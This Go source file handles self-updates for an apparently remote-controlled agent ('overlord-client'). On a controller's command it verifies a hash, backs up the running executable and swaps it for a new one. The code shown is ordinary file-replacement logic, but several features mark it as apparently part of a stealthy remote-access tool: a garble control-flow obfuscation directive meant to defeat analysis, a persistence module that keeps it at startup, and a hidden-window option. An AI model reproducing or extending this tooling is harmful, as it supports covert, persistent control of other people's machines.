package handlers

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"os"
	"path/filepath"
	"strings"
	"time"

	"overlord-client/cmd/agent/mutex"
	"overlord-client/cmd/agent/persistence"
	agentRuntime "overlord-client/cmd/agent/runtime"
	"overlord-client/cmd/agent/wire"
)

func HandleAgentUpdate(ctx context.Context, env *agentRuntime.Env, cmdID string, sourcePath string, expectedHash string, hideWindow bool) error {
	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
	sourcePath = strings.TrimSpace(sourcePath)
	if sourcePath == "" {
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: "missing update path"})
	}

	sourceAbs, err := filepath.Abs(sourcePath)
	if err != nil {
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: fmt.Sprintf("invalid update path: %v", err)})
	}
	if err := ensureRegularFileOnDisk(sourceAbs); err != nil {
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: err.Error()})
	}

	if err := verifyFileHash(sourceAbs, expectedHash); err != nil {
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: fmt.Sprintf("integrity check failed: %v", err)})
	}

	if err := wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true}); err != nil {
		return err
	}

	go func() {
		defer recoverAndLog("agent update", nil)
		// Let the command_result flush before beginning process replacement.
		time.Sleep(250 * time.Millisecond)
		mutex.ReleaseGlobal()
		if err := runAgentUpdate(sourceAbs, env.Cfg.EnablePersistence, hideWindow); err != nil {
			log.Printf("agent_update: %v", err)
			return
		}
		os.Exit(0)
	}()

	return nil
}

func resolveCurrentExecutableOnDisk() (string, error) {
	exePath, err := os.Executable()
	if err != nil {
		return "", fmt.Errorf("failed to resolve current executable: %w", err)
	}
	if realPath, err := filepath.EvalSymlinks(exePath); err == nil {
		exePath = realPath
	}
	absPath, err := filepath.Abs(exePath)
	if err != nil {
		return "", fmt.Errorf("failed to resolve absolute executable path: %w", err)
	}
	if err := ensureRegularFileOnDisk(absPath); err != nil {
		return "", fmt.Errorf("current executable is not a regular on-disk file: %w", err)
	}
	return absPath, nil
}

func ensureRegularFileOnDisk(path string) error {
	info, err := os.Stat(path)
	if err != nil {
		return fmt.Errorf("file %q is not available on disk: %w", path, err)
	}
	if !info.Mode().IsRegular() {
		return fmt.Errorf("file %q is not a regular file", path)
	}
	return nil
}

func copyExecutableAtomic(sourcePath string, targetPath string) error {
	srcFile, err := os.Open(sourcePath)
	if err != nil {
		return fmt.Errorf("failed to open source executable: %w", err)
	}
	defer srcFile.Close()

	dir := filepath.Dir(targetPath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return fmt.Errorf("failed to create target directory: %w", err)
	}

	tmpFile, err := os.CreateTemp(dir, "agent-update-*.tmp")
	if err != nil {
		return fmt.Errorf("failed to create temp executable: %w", err)
	}
	tmpPath := tmpFile.Name()
	defer func() {
		_ = tmpFile.Close()
		_ = os.Remove(tmpPath)
	}()

	if _, err := io.Copy(tmpFile, srcFile); err != nil {
		return fmt.Errorf("failed to copy executable: %w", err)
	}
	if err := tmpFile.Sync(); err != nil {
		return fmt.Errorf("failed to sync executable: %w", err)
	}
	if err := tmpFile.Close(); err != nil {
		return fmt.Errorf("failed to close temp executable: %w", err)
	}

	if err := os.Rename(tmpPath, targetPath); err != nil {
		if removeErr := os.Remove(targetPath); removeErr == nil {
			if retryErr := os.Rename(tmpPath, targetPath); retryErr == nil {
				return nil
			}
		}
		return fmt.Errorf("failed to replace executable at %s: %w", targetPath, err)
	}
	return nil
}

func startupTargetPath(enablePersistence bool) (string, bool, error) {
	if !enablePersistence {
		return "", false, nil
	}
	targetPath, err := persistence.TargetPath()
	if err != nil {
		return "", false, fmt.Errorf("failed to resolve startup target path: %w", err)
	}
	targetPath, err = filepath.Abs(targetPath)
	if err != nil {
		return "", false, fmt.Errorf("failed to resolve startup target absolute path: %w", err)
	}
	return targetPath, true, nil
}

func samePath(left string, right string) bool {
	if left == "" || right == "" {
		return false
	}
	return samePathByOS(left, right)
}

func verifyFileHash(filePath string, expectedHash string) error {
	if expectedHash == "" {
		return nil
	}
	f, err := os.Open(filePath)
	if err != nil {
		return fmt.Errorf("failed to open file for hash verification: %w", err)
	}
	defer f.Close()
	h := sha256.New()
	if _, err := io.Copy(h, f); err != nil {
		return fmt.Errorf("failed to compute file hash: %w", err)
	}
	actualHash := hex.EncodeToString(h.Sum(nil))
	if actualHash != expectedHash {
		return fmt.Errorf("hash mismatch: expected %s, got %s", expectedHash, actualHash)
	}
	return nil
}

func backupExecutable(targetPath string) error {
	info, err := os.Stat(targetPath)
	if err != nil || !info.Mode().IsRegular() {
		return nil
	}
	backupPath := targetPath + ".bak"
	src, err := os.Open(targetPath)
	if err != nil {
		return fmt.Errorf("failed to open executable for backup: %w", err)
	}
	defer src.Close()
	dst, err := os.OpenFile(backupPath, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, info.Mode().Perm())
	if err != nil {
		return fmt.Errorf("failed to create backup file: %w", err)
	}
	defer dst.Close()
	if _, err := io.Copy(dst, src); err != nil {
		return fmt.Errorf("failed to write backup: %w", err)
	}
	log.Printf("agent_update: backed up %q to %q", targetPath, backupPath)
	return nil
}
